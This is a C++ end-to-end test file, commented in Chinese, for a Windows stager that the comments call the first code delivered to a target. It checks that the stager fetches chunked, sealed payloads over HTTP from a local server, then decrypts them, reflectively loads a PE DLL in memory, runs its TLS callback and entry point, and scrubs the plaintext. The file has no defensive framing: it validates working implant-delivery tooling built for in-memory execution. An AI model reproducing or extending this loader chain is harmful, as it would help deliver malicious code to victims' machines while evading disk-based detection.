/*
 * agent_windows/tests/test_stager_win.cpp
 *
 * Windows 投送链端到端验证：**真连、真拉、真解、真装载、真执行**。
 *
 * 为什么这一条链必须端到端跑，而不是各层分别测：
 *   stager 是投送到目标的第一段代码。分层单测全绿但链路不通的情形在前面
 *   几轮反复出现（制品解包容量按"制品长度"分配必然不足、请求解析把
 *   "HTTP/1.1" 里的数字当成块号）。这些缺陷的共同点是：每一层单独看都
 *   自洽，只有真实字节流过整条链才暴露。
 *
 * 验证到的是"真执行"，不是"地址摆对了"：
 *   PE 的入口点与 TLS 回调是真实 x86-64 机器码，会把执行次数、rcx 收到的
 *   基址、以及**经重定位的指针**写进映像内记录区。测试断言这些值 ——
 *   若重定位没生效，解引用会读到错内容或崩，不会只是字节比对失败。
 *
 * 服务端走 shim 的 Winsock（转发宿主真实 TCP），因此 stager 必须真的连上、
 * 真的解析 HTTP 报文才能拿到块。
 */

#include "drop_stager_win.h"
#include "reflect_run.h"
#include "stager_srv.h"
#include "synth_pe.h"

#include "drop.h"
#include "packer.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <winmem.h>
#include <winsock2.h>

static int g_pass, g_fail;

#define CHECK(name, cond)                                              \
    do {                                                               \
        if (cond) { g_pass++; printf("[PASS] %s\n", (name)); }         \
        else      { g_fail++; printf("[FAIL] %s\n", (name)); }         \
    } while (0)

/* ---------------- 状态捕获 ---------------- */

static uint8_t *g_base;          /* region 基址，由 protect 回调捕获 */
static int      g_prot_calls;
static int      g_prot_fail_at = -1000;

/* 记录区快照：在 call 回调里、调用返回后立刻抓取 */
static uint64_t g_tls_count, g_tls_seq;
static uint64_t g_ent_count, g_ent_seq, g_ent_base, g_ent_reason, g_ent_ptr;
static int      g_calls;

static void snap(void)
{
    if (!g_base) return;
    g_tls_count  = synth_pe_rec(g_base, SYNTH_REC_TLS_RVA,   SYNTH_REC_COUNT);
    g_tls_seq    = synth_pe_rec(g_base, SYNTH_REC_TLS_RVA,   SYNTH_REC_SEQ);
    g_ent_count  = synth_pe_rec(g_base, SYNTH_REC_ENTRY_RVA, SYNTH_REC_COUNT);
    g_ent_seq    = synth_pe_rec(g_base, SYNTH_REC_ENTRY_RVA, SYNTH_REC_SEQ);
    g_ent_base   = synth_pe_rec(g_base, SYNTH_REC_ENTRY_RVA, SYNTH_REC_BASE);
    g_ent_reason = synth_pe_rec(g_base, SYNTH_REC_ENTRY_RVA, SYNTH_REC_REASON);
    g_ent_ptr    = synth_pe_rec(g_base, SYNTH_REC_ENTRY_RVA, SYNTH_REC_PTR);
}

static void reset_capture(void)
{
    g_base = NULL;
    g_prot_calls = 0;
    g_prot_fail_at = -1000;
    g_tls_count = g_tls_seq = 0;
    g_ent_count = g_ent_seq = 0;
    g_ent_base = g_ent_reason = g_ent_ptr = 0;
    g_calls = 0;
    synth_pe_seq_reset();
}

/* ---------------- rr_hooks ---------------- */

static int t_protect(void *ud, uint8_t *addr, size_t len, int prot)
{
    (void)ud;
    int idx = g_prot_calls++;
    if (idx == g_prot_fail_at) return -1;

    /* 第一次设权是头部区，addr 即 region 基址 */
    if (!g_base) g_base = addr;

    unsigned long p;
    if (prot == (RR_P_R | RR_P_X))          p = PAGE_EXECUTE_READ;
    else if (prot == (RR_P_R | RR_P_W))     p = PAGE_READWRITE;
    else if (prot == RR_P_R)                p = PAGE_READONLY;
    else if (prot == RR_P_X)                p = PAGE_EXECUTE;
    else if (prot == RR_P_W)                p = PAGE_READWRITE;
    else if (prot == RR_P_NONE)             p = PAGE_NOACCESS;
    else                                    return -1;   /* W|X 同存：不给绿灯 */

    unsigned long old = 0;
    return VirtualProtect(addr, len, p, &old) ? 0 : -1;
}

static int t_call(void *ud, uint64_t va, uint64_t a1, uint64_t a2, uint64_t a3,
                  uint64_t *ret)
{
    (void)ud;
    register uint64_t rc __asm__("rcx") = a1;
    register uint64_t rd __asm__("rdx") = a2;
    register uint64_t r8 __asm__("r8")  = a3;
    uint64_t v = va;
    uint64_t r = 0;

    /*
     * 刻意不在这里调整 rsp：%[v] 是内存操作数，GCC 常把它放在 rsp 相对槽位，
     * 若在 call 前先 sub rsp，该引用的地址就失效了（会跳到垃圾地址）。
     * 栈对齐由桩代码自身负责。
     */
    __asm__ __volatile__(
        "call *%[v]\n\t"
        : "=a"(r), "+r"(rc), "+r"(rd), "+r"(r8)
        : [v] "m"(v)
        : "memory", "cc"
    );
    g_calls++;
    snap();                       /* 必须在 region 被释放前抓取 */
    if (ret) *ret = r;
    return 0;
}

static int t_resolve(const char *dll, const char *func, uint16_t ord,
                     int by_ord, void *ud, uint64_t *out)
{
    (void)ud;
    if (by_ord) { *out = 0x1000u + ord; return LD_OK; }
    const char *p;
    uint64_t h = 0xcbf29ce484222325ULL;
    for (p = dll; *p; p++) { h ^= (uint64_t)(unsigned char)*p; h *= 0x100000001b3ULL; }
    h ^= (uint64_t)':'; h *= 0x100000001b3ULL;
    for (p = func; *p; p++) { h ^= (uint64_t)(unsigned char)*p; h *= 0x100000001b3ULL; }
    *out = 0x700000000000ULL + (h & 0xFFFFFFULL);
    return LD_OK;
}

/* ---------------- 制品 ---------------- */

static const uint8_t SEED[32] = {
    0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88, 0x99,0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x01,
    0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09, 0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x20
};

static uint8_t  g_pe[SYNTH_FILE_SIZE];
static uint8_t *g_blob;
static size_t   g_blob_len;
static dp_manifest_t g_manifest;

static int build_artifact(uint32_t chunk_size)
{
    synth_pe_build(g_pe, sizeof(g_pe), 1, 1);

    size_t bound = pk_size_bound_v4(SYNTH_FILE_SIZE);
    g_blob = (uint8_t *)malloc(bound);
    if (!g_blob) return -1;

    uint8_t zero32[32];
    memset(zero32, 0, sizeof(zero32));

    size_t out_len = bound;
    int rc = pk_pack_shaped(g_pe, SYNTH_FILE_SIZE, SEED, sizeof(SEED),
                            zero32, 1, zero32, g_blob, &out_len);
    if (rc != PK_OK) { printf("  pack rc=%d\n", rc); return -1; }
    g_blob_len = out_len;

    if (dp_manifest_build(g_blob, g_blob_len, chunk_size, &g_manifest) != DP_OK)
        return -1;
    return 0;
}

/* ---------------- 用例 ---------------- */

static void t_happy_path(void)
{
    stager_srv_t srv;
    memset(&srv, 0, sizeof(srv));
    srv.blob = g_blob; srv.blob_len = g_blob_len;
    srv.manifest = &g_manifest;
    srv.serve_limit = -1;
    srv.tamper_idx = -1;
    if (stager_srv_start(&srv) != 0) {
        printf("[FAIL] 服务端启动\n"); g_fail++; return;
    }

    rr_hooks_t h;
    memset(&h, 0, sizeof(h));
    h.protect = t_protect; h.call = t_call; h.resolve = t_resolve;

    wstage_cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.manifest = (const uint8_t *)&g_manifest;
    cfg.seed = SEED; cfg.seed_len = sizeof(SEED);
    cfg.ip = "127.0.0.1";
    cfg.port = srv.port;
    cfg.rh = &h;

    reset_capture();
    wstage_result_t r;
    memset(&r, 0, sizeof(r));
    int rc = wstage_run(&cfg, &r);
    stager_srv_stop(&srv);

    printf("  [INFO] rc=%d chunks=%u sealed=%u plain=%zu region=%zu/%zu\n",
           rc, r.chunks_fetched, r.sealed_len, r.plain_len,
           r.region_size, r.region_need);

    CHECK("端到端 rc == WS_OK", rc == WS_OK);
    CHECK("块数 == manifest.nchunks", r.chunks_fetched == g_manifest.nchunks);
    CHECK("sealed 长度 == 制品长度", r.sealed_len == (uint32_t)g_blob_len);
    CHECK("解包明文长度 == PE 文件大小", r.plain_len == (size_t)SYNTH_FILE_SIZE);
    CHECK("识别为 DLL", r.is_dll == 1);
    CHECK("machine == AMD64", r.machine == 0x8664);
    CHECK("region == PE 声明所需", r.region_size == r.region_need);
    CHECK("入口点确已被调用", r.entry_invoked == 1);
    CHECK("明文已擦除", r.scrubbed == 1);

    /* 真执行的证据：桩代码写入的记录 */
    CHECK("TLS 回调执行 1 次", g_tls_count == 1);
    CHECK("入口点执行 1 次", g_ent_count == 1);
    CHECK("TLS 先于入口点执行", g_tls_seq == 1 && g_ent_seq == 2);
    CHECK("入口 rcx == region 基址（DLL 入口语义）",
          g_ent_base == (uint64_t)(uintptr_t)g_base);
    CHECK("入口 reason == 1（DLL_PROCESS_ATTACH）", g_ent_reason == 1);
    CHECK("重定位生效：解引用得到 region+MARK",
          g_ent_ptr == (uint64_t)(uintptr_t)g_base + SYNTH_MARK_RVA);
}

static void t_starve(void)
{
    stager_srv_t srv;
    memset(&srv, 0, sizeof(srv));
    srv.blob = g_blob; srv.blob_len = g_blob_len;
    srv.manifest = &g_manifest;
    srv.serve_limit = (int)g_manifest.nchunks - 1;   /* 少给一块 */
    srv.tamper_idx = -1;
    if (stager_srv_start(&srv) != 0) { printf("[FAIL] 服务端启动\n"); g_fail++; return; }

    rr_hooks_t h;
    memset(&h, 0, sizeof(h));
    h.protect = t_protect; h.call = t_call; h.resolve = t_resolve;

    wstage_cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.manifest = (const uint8_t *)&g_manifest;
    cfg.seed = SEED; cfg.seed_len = sizeof(SEED);
    cfg.ip = "127.0.0.1"; cfg.port = srv.port; cfg.rh = &h;

    reset_capture();
    wstage_result_t r;
    memset(&r, 0, sizeof(r));
    int rc = wstage_run(&cfg, &r);
    stager_srv_stop(&srv);

    printf("  [INFO] 断供 rc=%d (%s)\n", rc, wstage_errstr(rc));
    CHECK("断供 -> 非零（诱饵不被当块收下）", rc != WS_OK);
    CHECK("断供 -> 未 seal", r.sealed_len == 0);
    CHECK("断供 -> 绝不执行任何代码", g_ent_count == 0 && g_tls_count == 0);
}

static void t_tamper(void)
{
    stager_srv_t srv;
    memset(&srv, 0, sizeof(srv));
    srv.blob = g_blob; srv.blob_len = g_blob_len;
    srv.manifest = &g_manifest;
    srv.serve_limit = -1;
    srv.tamper_idx = (int)g_manifest.nchunks - 1;
    if (stager_srv_start(&srv) != 0) { printf("[FAIL] 服务端启动\n"); g_fail++; return; }

    rr_hooks_t h;
    memset(&h, 0, sizeof(h));
    h.protect = t_protect; h.call = t_call; h.resolve = t_resolve;

    wstage_cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.manifest = (const uint8_t *)&g_manifest;
    cfg.seed = SEED; cfg.seed_len = sizeof(SEED);
    cfg.ip = "127.0.0.1"; cfg.port = srv.port; cfg.rh = &h;

    reset_capture();
    wstage_result_t r;
    memset(&r, 0, sizeof(r));
    int rc = wstage_run(&cfg, &r);
    stager_srv_stop(&srv);

    printf("  [INFO] 篡改 rc=%d (%s)\n", rc, wstage_errstr(rc));
    CHECK("篡改一块 -> WS_ERR_SEAL（摘要不符）", rc == WS_ERR_SEAL);
    CHECK("摘要不符 -> 绝不执行任何代码", g_ent_count == 0 && g_tls_count == 0);
}

static void t_bad_cfg(void)
{
    rr_hooks_t h;
    memset(&h, 0, sizeof(h));
    h.protect = t_protect; h.call = t_call; h.resolve = t_resolve;

    wstage_cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.manifest = (const uint8_t *)&g_manifest;
    cfg.seed = SEED; cfg.seed_len = sizeof(SEED);
    cfg.ip = "127.0.0.1"; cfg.port = 1; cfg.rh = &h;   /* 端口 1：必然拒绝 */

    reset_capture();
    int rc = wstage_run(&cfg, NULL);
    CHECK("服务端不可达 -> WS_ERR_FETCH", rc == WS_ERR_FETCH);

    /* 缺回调 */
    rr_hooks_t h2;
    memset(&h2, 0, sizeof(h2));
    h2.protect = t_protect; h2.resolve = t_resolve;      /* 缺 call */
    cfg.rh = &h2;
    CHECK("缺 call -> WS_ERR_ARG（不降级执行）", wstage_run(&cfg, NULL) == WS_ERR_ARG);

    /* 空参数 */
    CHECK("NULL cfg -> WS_ERR_ARG", wstage_run(NULL, NULL) == WS_ERR_ARG);

}

/*
 * 错误 seed：必须在服务端可达的前提下才测得准 ——
 * 否则先撞上 WS_ERR_FETCH，断言的是网络而不是密钥。
 */
static void t_bad_seed(void)
{
    stager_srv_t srv;
    memset(&srv, 0, sizeof(srv));
    srv.blob = g_blob; srv.blob_len = g_blob_len;
    srv.manifest = &g_manifest;
    srv.serve_limit = -1; srv.tamper_idx = -1;
    if (stager_srv_start(&srv) != 0) { printf("[FAIL] 服务端启动\n"); g_fail++; return; }

    rr_hooks_t h;
    memset(&h, 0, sizeof(h));
    h.protect = t_protect; h.call = t_call; h.resolve = t_resolve;

    uint8_t bad_seed[32];
    memset(bad_seed, 0xAB, sizeof(bad_seed));

    wstage_cfg_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    cfg.manifest = (const uint8_t *)&g_manifest;
    cfg.seed = bad_seed; cfg.seed_len = sizeof(bad_seed);
    cfg.ip = "127.0.0.1"; cfg.port = srv.port; cfg.rh = &h;

    reset_capture();
    wstage_result_t r;
    memset(&r, 0, sizeof(r));
    int rc = wstage_run(&cfg, &r);
    stager_srv_stop(&srv);

    printf("  [INFO] 错误 seed rc=%d (%s)\n", rc, wstage_errstr(rc));
    CHECK("错误 seed -> 解包失败", rc == WS_ERR_UNPACK);
    CHECK("错误 seed -> 绝不执行任何代码", g_ent_count == 0 && g_tls_count == 0);
}

int main(void)
{
    if (build_artifact(1024) != 0) {
        printf("[FAIL] 制品构造失败\n");
        return 1;
    }
    printf("[INFO] 制品 %zu 字节 -> %u 块（chunk=1024）\n",
           g_blob_len, g_manifest.nchunks);

    t_happy_path();
    t_starve();
    t_tamper();
    t_bad_cfg();
    t_bad_seed();

    printf("\n=== result: %d pass, %d fail ===\n", g_pass, g_fail);
    free(g_blob);
    return g_fail ? 1 : 0;
}
